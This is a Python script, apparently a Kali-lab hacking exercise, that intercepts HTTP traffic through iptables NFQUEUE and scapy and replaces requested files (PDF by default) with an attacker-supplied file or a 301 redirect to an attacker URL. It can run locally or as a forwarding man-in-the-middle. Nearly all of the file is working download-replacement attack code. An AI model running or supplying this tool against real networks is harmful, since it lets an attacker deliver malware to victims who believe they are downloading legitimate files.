#! /usr/bin/env python

import argparse
import os
import subprocess
import netfilterqueue
import scapy.all as scapy


#TODO argpars - file exention (pdf, exe...), url to file location, path_to_file



def getArg():
    parser = argparse.ArgumentParser("File Sniffer")
    parser.add_argument("-q", "--queue-number", type=int, required=True, dest="queueNumber", metavar="",
                        help="[?] Number of queue")
    parser.add_argument("-p", "--port", type=int, nargs='+', required=False, default=80, dest="portList", metavar="",
                        help="[?] Input target app port, you can use pool of port. Default - 80")
    parser.add_argument("-fe", "--file-extension", type=str, nargs='+', required=False, default='pdf', dest="fileExt", metavar="",
                        help="[?] Input which file extension catch. Default: pdf")
    parser.add_argument("-url", "--file-url", type=str, required=False, dest="fileUrl", metavar="",
                        help="[?] Input url on which redirect")
    parser.add_argument("-fp", "--file-path", type=str, required=False, dest="filePath", metavar="",
                        help="[?] Input file which send")
    parser.add_argument("-u", "--usage", type=int, required=False, default=0, dest="usage", metavar="",
                        help="[?] Local or Public usage (iptables settings). 0 - Local; Else Public")
    parser.add_argument("-e", "--print-traceback", type=int, required=False, default=0, dest="error", metavar="",
                        help="[?] Print traceback, can extremely close the program -> use iptables --flush. "
                             "0 - No; Else Yes")
    return parser.parse_args()

# url = "https://appdownload.deepl.com/windows/0install/DeepLSetup.exe"
# path_to_pdf = r'/home/kali/Desktop/1FirstClick.pdf'

url = getArg().fileUrl
path_to_pdf = getArg().filePath

def getPorts(arg):
    port=[]
    if not isinstance(arg, int):
        for el in getArg().portList:
            port.append(el)
    else:
        port.append(arg)
    return port
def getExtension(arg):
    extension=[]
    for el in getArg().fileExt:
        extension.append(el.encode())
    return extension

ack_list = []


def fileChange(scapy_packet):
    print("[+] Changing file...")

    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum


    if getArg().fileUrl:
        new_load = (
            "HTTP/1.1 301 Moved Permanently\r\n"
            f"Location: {url}\r\n"
            "Content-Length: 0\r\n"
            "\r\n"
        )
        scapy_packet[scapy.Raw].load = new_load.encode()

    if getArg().filePath:
        with open(path_to_pdf, "rb") as f:
            new_pdf_content = f.read()

        new_load = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/pdf\r\n"
            f"Content-Length: {len(new_pdf_content)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode() + new_pdf_content
        scapy_packet[scapy.Raw].load = new_load

    return scapy_packet

def packetProccess(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    try:
        if scapy_packet.haslayer(scapy.Raw):

            if scapy_packet.haslayer(scapy.TCP):
                load = scapy_packet[scapy.Raw].load

                for port in getPorts(getArg().portList):
                    for extension in getExtension(getArg().fileExt):

                        if scapy_packet[scapy.TCP].dport == port:
                            if extension in load:
                                print("[+] Detecting file Request")
                                ack_list.append(scapy_packet[scapy.TCP].ack)


                        elif scapy_packet[scapy.TCP].sport == port:
                            if extension in load and scapy_packet[scapy.TCP].seq in ack_list:
                                ack_list.remove(scapy_packet[scapy.TCP].seq)
                                print("[+] Detecting file Response")

                                modifiedPacket = fileChange(scapy_packet)

                                packet.set_payload(bytes(modifiedPacket))
                                print("Complete")

    except Exception as e:
        if getArg().error == 0:
            print(e)
        else:
            print(e.with_traceback())
    packet.accept()




def fileSnif():
    if os.getuid() != 0:
        print("Use super user mod")
        exit()

    if getArg().usage == 0:
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        print("Usage: Local")
        print("-" * 20)
    else:
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        print("Usage: Public")
        print("-" * 20)

    if getArg().fileUrl and getArg().filePath:
        print("[-] Use -u or -fp flag")
        exit()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(getArg().queueNumber, packetProccess)
    queue.run()

if __name__ == '__main__':
    try:
        print(f"Ports: {getArg().portList}")
        print(f"Ex: {getExtension(getArg().fileExt)}")
        print(f"Url: {getArg().fileUrl}")
        print(f"File-path: {getArg().filePath}")
        if getArg().error == 0:
            print("Traceback: No")
        else:
            print("Traceback: Yes")
        fileSnif()
    except KeyboardInterrupt:
        subprocess.call(["iptables", "--flush"])
        print("\nDetected ctrl + C")
        exit()


